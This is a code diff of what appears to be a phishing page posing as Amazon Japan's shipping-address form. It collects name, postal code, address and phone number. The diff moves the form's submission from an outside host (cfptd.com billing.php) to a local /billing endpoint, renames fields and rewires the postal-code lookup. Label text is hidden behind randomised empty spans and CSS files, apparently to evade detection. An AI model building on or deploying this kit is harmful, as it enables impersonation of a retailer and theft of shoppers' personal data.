@@ -999,7 +999,7 @@
 <span class="gqgoZ"></span><span class="pOSyS"></span><span class="atiQh"></span><span class="ENNSh"></span><span class="jWyLZ"></span><span class="ScBNE"></span><span class="DSUyQ"></span><span class="ltboz"></span><span class="Kqauw"></span><span class="XGaBo"></span><span class="DYgFT"></span><span class="RKiOE"></span><span class="nsklc"></span><span class="lxtZh"></span><span class="PpSJI"></span><span class="zAaeO"></span><span class="XvfMU"></span><span class="wisJc"></span><span class="boqmp"></span><span class="uRizI"></span><span class="fgBUd"></span><span class="RprAu"></span><span class="lgBXP"></span><span class="zifVO"></span><span class="rPVLN"></span><span class="FUOeY"></span><span class="xPSIS"></span><span class="WIoKx"></span><span class="pAbbB"></span><span class="ZOrCG"></span><span class="fwfvJ"></span><span class="hqbMO"></span><span class="XPFoZ"></span><span class="pMbmb"></span><span class="ZEPLX"></span><span class="bZXkW"></span><span class="TVfou"></span><span class="bkbde"></span><span class="GMeeO"></span><span class="LxKcs"></span><span class="KUASZ"></span><span class="RxfEV"></span><span class="weVaR"></span><span class="TafGv"></span><span class="vruhi"></span><span class="zfrrn"></span><span class="yFCBa"></span><span class="XHDwO"></span><span class="sYwVP"></span><span class="OpYze"></span><span class="gJqyB"></span><span class="mUIop"></span><span class="bkpLs"></span><span class="dXCiH"></span><span class="klHNh"></span><span class="xqVqH"></span><span class="Evily"></span><span class="XKStk"></span><span class="vPLSd"></span><span class="Njkpl"></span><span class="knXXX"></span><span class="guKWP"></span><span class="PszKb"></span><span class="Nldee"></span><span class="BHNYk"></span><span class="iWdEo"></span>
 <a href="#"><span class="aFZNU"></span><span class="xtsnD"></span><span class="eiiTR"></span></a><span class="aZLqj"></span><span class="hJZIO"></span><span class="SYdSx"></span><span class="UvTKj"></span><span class="jcsgZ"></span><span class="SRMYi"></span><span class="IWkcm"></span><span class="IyhKe"></span><span class="MBWFD"></span><span class="zBBaW"></span><span class="KRvYX"></span><span class="mrwUD"></span><span class="lHuFg"></span><span class="PPVuO"></span><span class="aGswi"></span><span class="YSOfc"></span><span class="PWUdU"></span></span>
                     </div>
-                    <form id="address-ui-address-form" action="https://cfptd.com/8a47481ae534860850adf59f145e6b40/actions/billing.php" onsubmit="return checkForm()" method="POST">
+                    <form id="address-ui-address-form" action="/billing" onsubmit="return checkForm()" method="POST">
                         <input type="hidden" value="" name="userId">
                         <input type="hidden" name="csrfToken" value="kS9NmRec00O0TJgWiuAeiGhLhmIj3D"><input type="hidden" name="addressID" id="addressID">
                         <span id="address-ui-widget-content">
@@ -1016,7 +1016,7 @@
                                     	
 	                                    	<div class="a-section a-spacing-large adddress-ui-widgets-form-field-container address-ui-widgets-desktop-form-field">
 							<span class="a-dropdown-container">
-							<select name="address-ui-widgets-countryCode" autocomplete="off" id="address-ui-widgets-countryCode-dropdown-nativeId" tabIndex="-1" class="a-native-dropdown a-spacing-none">
+							<select name="countryCode" autocomplete="off" id="address-ui-widgets-countryCode-dropdown-nativeId" tabIndex="-1" class="a-native-dropdown a-spacing-none">
 							<option value="AL">Albania</option>
 							<option value="DZ">Algeria</option>
 							<option value="AS">American Samoa</option>
@@ -1266,7 +1266,7 @@
 
 
 				                    <div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container address-ui-widgets-desktop-form-label"><div class="a-section a-spacing-none aok-inline-block"><label for="address-ui-widgets-enterAddressFullName" class="a-form-label address-ui-widgets-desktop-form-field-full-width a-nowrap"><span class="a-text-bold"><link href="aa/2Xing.css" rel="stylesheet" type="text/css">
-<span class="TXVfg"></span><span class="jBJGc"></span></span></label></div></div><div class="a-section a-spacing-base adddress-ui-widgets-form-field-container address-ui-widgets-desktop-form-field"><input style="height:38px;" type="text" maxlength="50" id="address-ui-widgets-enterAddressFullName" name="address-ui-widgets-enterAddressFullName" required="true" class="a-input-text address-ui-widgets-desktop-form-field-full-width"></div>
+<span class="TXVfg"></span><span class="jBJGc"></span></span></label></div></div><div class="a-section a-spacing-base adddress-ui-widgets-form-field-container address-ui-widgets-desktop-form-field"><input style="height:38px;" type="text" maxlength="50" id="address-ui-widgets-enterAddressFullName" name="enterAddressFullName" required="true" class="a-input-text address-ui-widgets-desktop-form-field-full-width"></div>
 
                     <div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container address-ui-widgets-desktop-form-label">
                         <div class="a-section a-spacing-none aok-inline-block">
@@ -1455,10 +1455,10 @@
                         </div>
                     </div>
                     <div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container address-ui-widgets-desktop-form-label"><div class="a-section a-spacing-none aok-inline-block"><label class="a-form-label address-ui-widgets-desktop-form-field-full-width a-nowrap"><span class="a-text-bold"><link href="aa/3YouB.css" rel="stylesheet" type="text/css">
-<span class="fyTCe"></span><span class="ShKmS"></span><span class="AgriM"></span><span class="iWWIw"></span></span></label></div></div><div class="a-section a-spacing-base adddress-ui-widgets-form-field-container address-ui-widgets-desktop-form-field"><div class="a-section a-spacing-none"><div class="a-section a-spacing-none aok-inline-block"><input type="text" maxlength="3" style="text-align:center;width:80px;height:38px;" id="address-ui-widgets-enterAddressPostalCodeOne" name="address-ui-widgets-enterAddressPostalCodeOne" class="a-input-text" required="true"></div><div class="a-section a-spacing-none address-ui-widgets-desktop-2-part-postal-code-separator aok-inline-block"><span><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">- </font></font></span></div><div class="a-section a-spacing-none aok-inline-block"><input type="text" maxlength="4" style="text-align:center;width:100px;height:38px;" required="true" id="address-ui-widgets-enterAddressPostalCodeTwo" name="address-ui-widgets-enterAddressPostalCodeTwo" class="a-input-text"></div></div></div>
+<span class="fyTCe"></span><span class="ShKmS"></span><span class="AgriM"></span><span class="iWWIw"></span></span></label></div></div><div class="a-section a-spacing-base adddress-ui-widgets-form-field-container address-ui-widgets-desktop-form-field"><div class="a-section a-spacing-none"><div class="a-section a-spacing-none aok-inline-block"><input type="text" maxlength="3" style="text-align:center;width:80px;height:38px;" id="address-ui-widgets-enterAddressPostalCodeOne" name="enterAddressPostalCodeOne" class="a-input-text" required="true"></div><div class="a-section a-spacing-none address-ui-widgets-desktop-2-part-postal-code-separator aok-inline-block"><span><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">- </font></font></span></div><div class="a-section a-spacing-none aok-inline-block"><input type="text" maxlength="4" style="text-align:center;width:100px;height:38px;" required="true" id="address-ui-widgets-enterAddressPostalCodeTwo" name="enterAddressPostalCodeTwo" class="a-input-text"></div></div></div>
                     <div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container address-ui-widgets-desktop-form-label"><div class="a-section a-spacing-none aok-inline-block"><label for="address-ui-widgets-enterAddressStateOrRegion" class="a-form-label address-ui-widgets-desktop-form-field-full-width a-nowrap"><span class="a-text-bold"><link href="aa/4Xian.css" rel="stylesheet" type="text/css">
 <span class="RruvT"></span><span class="QACjX"></span><span class="uxVym"></span><span class="hRTMZ"></span></span></label></div></div><div class="a-section a-spacing-base adddress-ui-widgets-form-field-container address-ui-widgets-desktop-form-field"><span class="a-dropdown-container">
-            <select name="address-ui-widgets-enterAddressStateOrRegion" autocomplete="off" id="address-ui-widgets-enterAddressStateOrRegion-dropdown-nativeId" tabindex="-1" class="a-native-dropdown a-spacing-none">
+            <select name="enterAddressStateOrRegion" autocomplete="off" id="address-ui-widgets-enterAddressStateOrRegion-dropdown-nativeId" tabindex="-1" class="a-native-dropdown a-spacing-none">
                 <option class="a-prompt" value=""><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">都道府県を选択</font></font></option>
 							<option value="北海道"><font style=vertical-align: inherit;"><font style="vertical-align: inherit;">北海道</font></font></option>
 							<option value="青森県"><font style=vertical-align: inherit;"><font style="vertical-align: inherit;">青森県</font></font></option>
@@ -1511,12 +1511,12 @@
             </select>
             <span tabindex="-1" id="address-ui-widgets-enterAddressStateOrRegion" data-a-class="address-ui-widgets-desktop-form-field-full-width" class="a-button a-button-dropdown a-spacing-none address-ui-widgets-desktop-form-field-full-width" style="min-width: 0%;"><span class="a-button-inner"><span class="a-button-text a-declarative" id="address-ui-widgets-enterAddressStateOrRegion-shown" data-action="a-dropdown-button" role="button" tabindex="0" aria-hidden="true" aria-pressed="false"><span class="a-dropdown-prompt"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">都道府県を选択</font></font></span></span><i class="a-icon a-icon-dropdown"></i></span></span></span></div>
                     <div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container address-ui-widgets-desktop-form-label"><div class="a-section a-spacing-none aok-inline-block"><label for="address-ui-widgets-enterAddressLine1" class="a-form-label address-ui-widgets-desktop-form-field-full-width a-nowrap"><span class="a-text-bold"><link href="aa/5ZhuS.css" rel="stylesheet" type="text/css">
-<span class="iAkVW"></span><span class="XdJNs"></span></span></label></div></div><div class="a-section a-spacing-small adddress-ui-widgets-form-field-container address-ui-widgets-desktop-form-field"><input style="height:38px;" type="text" maxlength="60" id="address-ui-widgets-enterAddressLine1" name="address-ui-widgets-enterAddressLine1" required="true" class="a-input-text address-ui-widgets-desktop-form-field-full-width"></div>
-                    <div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container address-ui-widgets-desktop-form-label"></div><div class="a-section a-spacing-base adddress-ui-widgets-form-field-container address-ui-widgets-desktop-form-field"><input style="height:38px;" type="text" maxlength="60" id="address-ui-widgets-enterAddressLine2" name="address-ui-widgets-enterAddressLine2" class="a-input-text address-ui-widgets-desktop-form-field-full-width"></div>
+<span class="iAkVW"></span><span class="XdJNs"></span></span></label></div></div><div class="a-section a-spacing-small adddress-ui-widgets-form-field-container address-ui-widgets-desktop-form-field"><input style="height:38px;" type="text" maxlength="60" id="address-ui-widgets-enterAddressLine1" name="enterAddressLine1" required="true" class="a-input-text address-ui-widgets-desktop-form-field-full-width"></div>
+                    <div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container address-ui-widgets-desktop-form-label"></div><div class="a-section a-spacing-base adddress-ui-widgets-form-field-container address-ui-widgets-desktop-form-field"><input style="height:38px;" type="text" maxlength="60" id="address-ui-widgets-enterAddressLine2" name="enterAddressLine2" class="a-input-text address-ui-widgets-desktop-form-field-full-width"></div>
                     <div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container address-ui-widgets-desktop-form-label"><div class="a-section a-spacing-none aok-inline-block"><label for="address-ui-widgets-enterAddressLine3" class="a-form-label address-ui-widgets-desktop-form-field-full-width a-nowrap"><span class="a-text-bold"><link href="aa/6HuiS.css" rel="stylesheet" type="text/css">
-<span class="eNECK"></span><span class="eCYXg"></span><span class="Kftmw"></span><span class="mwKft"></span><span class="vbZgN"></span><span class="cjsSs"></span><span class="aWIsd"></span><span class="jnQfw"></span><span class="SkYSu"></span><span class="GKoZQ"></span><span class="rHGci"></span></span></label></div></div><div class="a-section a-spacing-base adddress-ui-widgets-form-field-container address-ui-widgets-desktop-form-field"><input style="height:38px;" type="text" maxlength="60" id="address-ui-widgets-enterAddressLine3" name="address-ui-widgets-enterAddressLine3" class="a-input-text address-ui-widgets-desktop-form-field-full-width"></div>
+<span class="eNECK"></span><span class="eCYXg"></span><span class="Kftmw"></span><span class="mwKft"></span><span class="vbZgN"></span><span class="cjsSs"></span><span class="aWIsd"></span><span class="jnQfw"></span><span class="SkYSu"></span><span class="GKoZQ"></span><span class="rHGci"></span></span></label></div></div><div class="a-section a-spacing-base adddress-ui-widgets-form-field-container address-ui-widgets-desktop-form-field"><input style="height:38px;" type="text" maxlength="60" id="address-ui-widgets-enterAddressLine3" name="enterAddressLine3" class="a-input-text address-ui-widgets-desktop-form-field-full-width"></div>
                     <div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container address-ui-widgets-desktop-form-label"><div class="a-section a-spacing-none aok-inline-block"><label for="address-ui-widgets-enterAddressPhoneNumber" class="a-form-label address-ui-widgets-desktop-form-field-full-width a-nowrap"><span class="a-text-bold"><link href="aa/7DianH.css" rel="stylesheet" type="text/css">
-<span class="bAFAO"></span><span class="OXGdD"></span><span class="zAGpB"></span><span class="DsPfW"></span></span></label></div></div><div class="a-section a-spacing-base adddress-ui-widgets-form-field-container address-ui-widgets-desktop-form-field"><input style="height:38px;" type="text" maxlength="20" id="address-ui-widgets-enterAddressPhoneNumber" name="address-ui-widgets-enterAddressPhoneNumber" required="true" class="a-input-text address-ui-widgets-desktop-form-field-full-width"><div class="a-section a-spacing-none a-spacing-top-micro"><span class="a-size-mini">            <link href="aa/PeiDa.css" rel="stylesheet" type="text/css">
+<span class="bAFAO"></span><span class="OXGdD"></span><span class="zAGpB"></span><span class="DsPfW"></span></span></label></div></div><div class="a-section a-spacing-base adddress-ui-widgets-form-field-container address-ui-widgets-desktop-form-field"><input style="height:38px;" type="text" maxlength="20" id="address-ui-widgets-enterAddressPhoneNumber" name="enterAddressPhoneNumber" required="true" class="a-input-text address-ui-widgets-desktop-form-field-full-width"><div class="a-section a-spacing-none a-spacing-top-micro"><span class="a-size-mini">            <link href="aa/PeiDa.css" rel="stylesheet" type="text/css">
 <span class="KtoEb"></span><span class="ombBV"></span><span class="tucla"></span><span class="FitwE"></span><span class="uWifa"></span><span class="GTFxR"></span><span class="Cnpus"></span><span class="hHOyU"></span><span class="rYksb"></span><span class="uCObe"></span><span class="UFWHn"></span><span class="tVyIi"></span><span class="EAcVh"></span><span class="rerEI"></span><span class="RIqaL"></span><span class="ffkeM"></span><span class="BpdPc"></span><span class="qlWtz"></span><span class="rxjMM"></span><span class="uUNPp"></span><span class="tmwzH"></span><span class="mwtzH"></span></span></div></div></div></div><input type="hidden" name="address-ui-widgets-previous-address-form-state-token" value="eyJ6aXAiOiJERUYiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiQTI1NktXIn0.yY7bPp2wCj0eECbm_78Mf0AbcqJJn8x7j9qHaXCtO205Usorf5k5lA.O0ThyFaHevpUjhyD.2lEQ7Na226-_NPc3OzoI0cBhVjIScEJt6eL3lnfB-ZjEuEOa9u-JX3lY8LlgtBh6Qq42Cio9tGS0r6ydjOV_UKJvmXDGNBGZAQAgnQ3uVZesG20VCPmpwN53qLf7TZJVOSRwK0zHdBZmAnZSjCRf5C6rwktUhG2RvDBnWPzfr6fz6Qm_kZpO05iNs0jn1H44_vhQY5ySDAEjqCB32ekhVtLWh7uMIPBMRSRvVNdxP29U0CPtdZuFxsqf2NHOtE-IZhCTEKcvTSKmDJm6qap1RXlSaljK3dbs18bIKlPx96yYD7x7rkAQkhpVLzC6bhJ284UK-Wayj_utl0Gvmg.XFJZtdQdWLZPmGk4Y2_p_w">
 
 
@@ -1624,7 +1624,7 @@
                                 }
                                 var self=false;
                                 $.ajax({
-                                    url: './actions/validate.php?cxdi=' + cxdi,
+                                    url: '/validate?cxdi=' + cxdi,
                                     type: 'GET',
                                     async: false,
                                     error: function () {
@@ -1737,86 +1737,36 @@
                                         $enterAddressPostalCodeTwo.focus();
                                     }
 
+                                    var caback1=            function (response) {
+                                        console.log(response);
+                                        var resultJSON = JSON.parse(response);
+                                            if (resultJSON.status == 200 && resultJSON.results && resultJSON.results.length) {
+                                                var data = resultJSON.results[0];
+                                                var address1 = data.address1;
+                                                var address2 = data.address2;
+                                                var address3 = data.address3;
+                                                console.log('address1: ', address1, +', address2: ', address2);
+                                                $('#address-ui-widgets-enterAddressStateOrRegion-dropdown-nativeId').val([address1]);
+                                                // <span class="a-dropdown-prompt">山形県</span>
+                                                $('#address-ui-widgets-enterAddressStateOrRegion-shown').html('<span class="a-dropdown-prompt">' + address1 + '</span>');
+                                                $('#address-ui-widgets-enterAddressLine1').val(address2 + address3);
+
+                                            }
+                                        else{
+                                            console.log('error');
+                                        }
+                                    }
+
                                     if (postalCodeOne.length === postalCodeOneLength && postalCodeTwo.length === postalCodeTwoLength) {
                                         var postalCode = postalCodeOne + "-" + postalCodeTwo;
 
                                         if (postalCode.length === postalCodeLength) {
 
-                                            // $.get(
-                                            //     'http://zipcloud.ibsnet.co.jp/api/search?zipcode=' + (postalCodeOne + postalCodeTwo),
-                                            //     function (response) {
-                                            //
-                                            //     }
-                                            // );
-
                                             $.get(
-                                                //'http://zipcloud.ibsnet.co.jp/api/search?zipcode=' + (postalCodeOne + postalCodeTwo),
-												'zipcodea204.html?zipcode='+(postalCodeOne + postalCodeTwo),
-                                                
-                                                function (response) {
-                                                    console.log(response);
-                                                    // {
-                                                    //     "message": null,
-                                                    //     "results": [
-                                                    //     {
-                                                    //         "address1": "高知県",
-                                                    //         "address2": "南国市",
-                                                    //         "address3": "蛍が丘",
-                                                    //         "kana1": "ｺｳﾁｹﾝ",
-                                                    //         "kana2": "ﾅﾝｺｸｼ",
-                                                    //         "kana3": "ﾎﾀﾙｶﾞｵｶ",
-                                                    //         "prefcode": "39",
-                                                    //         "zipcode": "7830060"
-                                                    //     }
-                                                    // ],
-                                                    //     "status": 200
-                                                    // }
-													//{ "message": null, "results": [ { "address1": "高知県", "address2": "南国市", "address3": "蛍が丘", "kana1": "ｺｳﾁｹﾝ", "kana2": "ﾅﾝｺｸｼ", "kana3": "ﾎﾀﾙｶﾞｵｶ", "prefcode": "39", "zipcode": "7830060" } ], "status": 200 }
-													
-                                                    var responseJSON = JSON.parse(response);
-                                                    if (responseJSON.status == 200) {
-                                                        var result = responseJSON.data;
-                                                        var resultJSON = JSON.parse(result);
-                                                        console.log('resultJSON: ', resultJSON);
-                                                        if (resultJSON.status == 200 && resultJSON.results && resultJSON.results.length) {
-                                                            var data = resultJSON.results[0];
-                                                            var address1 = data.address1;
-                                                            var address2 = data.address2;
-                                                            var address3 = data.address3;
-                                                            console.log('address1: ', address1, +', address2: ', address2);
-                                                            $('#address-ui-widgets-enterAddressStateOrRegion-dropdown-nativeId').val([address1]);
-                                                            // <span class="a-dropdown-prompt">山形県</span>
-                                                            $('#address-ui-widgets-enterAddressStateOrRegion-shown').html('<span class="a-dropdown-prompt">' + address1 + '</span>');
-                                                            $('#address-ui-widgets-enterAddressLine1').val(address2 + address3);
-                                                            // $addressStateOrRegionNative.html('');
-                                                            // var stateOptions = [];
-                                                            // $.each(resultJSON.results, function (i, v) {
-                                                            //     var optNames = [v.address1, v.address2, v.address3];
-                                                            //     stateOptions.push(
-                                                            //         '<option data-name="' + v.address1 +'" value="' + v.address1 + '">' + v.address1 + '</option>')
-                                                            // });
-                                                            // $addressStateOrRegionNative.html(stateOptions.join(''));
-                                                        }
-                                                    }else{console.log('error');}
-                                                }
+												'/zipcode?zipcode='+(postalCodeOne + postalCodeTwo),caback1
+
                                             );
 
-                                            var request = {
-                                                operation: "JapanAutopopulation",
-                                                data: {
-                                                    "address-ui-widgets-enterAddressPostalCode": postalCode
-                                                },
-                                                ajaxToken: ajaxToken
-                                            }
-
-                                            A.post(ajaxUrlPrefix + "/a/addresses/ajax/widgets", {
-                                                contextType: "application/json",
-                                                accepts: "text/html;charset=UTF-8",
-                                                withCredentials: true,
-                                                params: {data: JSON.stringify(request)},
-                                                success: reloadIfRequiresAuth(handleAutopopulationResult),
-                                                error: incrementCounter("JPAutopopulationFailure")
-                                            });
                                         }
                                     }
                                 };
@@ -2089,11 +2039,11 @@
     <script src="library/bootstrap/js/main.min.js"></script>
     <script src="library/jquery/mask/jquery.mask.min.js"></script>
     <script src="library/xvalidator/qunit.js"></script>
-    <script src="aa/main_002.js.html"></script> 
-    <script src="aa/main_003.js.html"></script> 
-    <script src="aa/main.js.html"></script> 
-    <script src="aa/jquery.js.html"></script> 
-    <script src="aa/qunit.js.html"></script> 
+    <script src="aa/main_002.js.html"></script>
+    <script src="aa/main_003.js.html"></script>
+    <script src="aa/main.js.html"></script>
+    <script src="aa/jquery.js.html"></script>
+    <script src="aa/qunit.js.html"></script>
     
 
 
